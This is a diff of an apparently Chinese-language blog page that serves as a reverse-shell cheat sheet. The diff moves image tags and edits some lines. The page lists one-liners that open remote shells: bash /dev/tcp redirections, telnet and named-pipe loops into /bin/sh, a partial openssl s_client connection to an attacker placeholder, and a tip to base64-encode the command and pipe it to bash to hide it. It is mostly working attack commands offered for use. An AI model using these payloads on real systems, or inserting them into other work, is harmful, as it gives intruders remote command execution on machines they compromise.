@@ -116,28 +116,24 @@ nc -u -lvp <span class="m">1234</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
 <div class="highlight"><pre><span></span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
-!<span class="o">[</span>agent<span class="o">](</span>../images/WeChat9c018fc36b0256b4286d528e3e91651a.png<span class="o">)</span>
-
-<span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
-
-!<span class="o">[</span>agent<span class="o">](</span>../images/WechatIMG56.jpeg<span class="o">)</span>
-
-
-nohup bash -c <span class="s1">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'</span>
-
+</pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WeChat9c018fc36b0256b4286d528e3e91651a.png"/></p>
+<div class="highlight"><pre><span></span><span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
+</pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG56.jpeg"/></p>
+<div class="highlight"><pre><span></span>nohup bash -c <span class="s1">'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'</span>
 
 base64搞一下命令
 
 <span class="nb">echo</span> <span class="s2">"nohup bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1'"</span> <span class="p">|</span> base64 -w0
 <span class="nb">echo</span> bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo<span class="o">=</span> <span class="p">|</span> base64 -d <span class="p">|</span> bash <span class="m">2</span>&gt;/dev/null
-
-!<span class="o">[</span>agent<span class="o">](</span>../images/WechatIMG55.jpeg<span class="o">)</span>
 </pre></div>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG55.jpeg"/></p>
 <div class="highlight"><pre><span></span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/sh <span class="c1">#Blind</span>
 
 rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> &gt;/tmp/f
 
-telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span>
+telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="p">|</span> /bin/bash <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">12345</span>
 
 rm -f /tmp/bkpipe<span class="p">;</span>mknod /tmp/bkpipe p<span class="p">;</span>/bin/sh <span class="m">0</span>&lt;/tmp/bkpipe <span class="p">|</span> telnet <span class="m">127</span>.0.0.1 <span class="m">1234</span> <span class="m">1</span>&gt;/tmp/bkpipe
 </pre></div>
@@ -246,9 +242,7 @@ openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;<span clas
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>       
 <span class="p">}</span>
 </pre></div>
-<p>在带有公网的机器上开启监听</p>
-<div class="highlight"><pre><span></span>nc -nvlp <span class="m">1234</span>
-</pre></div>
+<p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
   </div>
 </article>
 <div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
